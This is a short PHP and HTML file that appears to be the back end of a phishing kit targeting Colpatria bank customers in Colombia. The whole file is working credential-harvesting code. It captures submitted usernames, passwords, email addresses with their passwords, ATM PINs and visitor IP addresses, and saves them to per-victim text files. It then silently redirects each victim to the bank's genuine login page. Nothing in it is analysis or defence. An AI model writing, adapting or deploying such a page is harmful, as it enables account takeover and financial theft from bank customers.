<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />

<?php
$usuario = $_POST['usuario'];
$pass = $_POST['pass'];
$email = $_POST['email'];
$cpass = $_POST['cpass'];
$ccpass = $_POST['ccpass'];
$ip = $_SERVER['REMOTE_ADDR'];
$contenido="

Usuario: $usuario
Contraseña: $pass
Correo: $email
Clave Correo: $cpass
Clave Cajero: $ccpass
IP: $ip
";

$archivo=fopen("recibido/$usuario.txt","w");
fwrite($archivo,$contenido);
?>


</head>

<body>

<script> window.location.href="https://www.banco.colpatria.com.co/banca-virtual/login/";						</script>
</body>
</html>
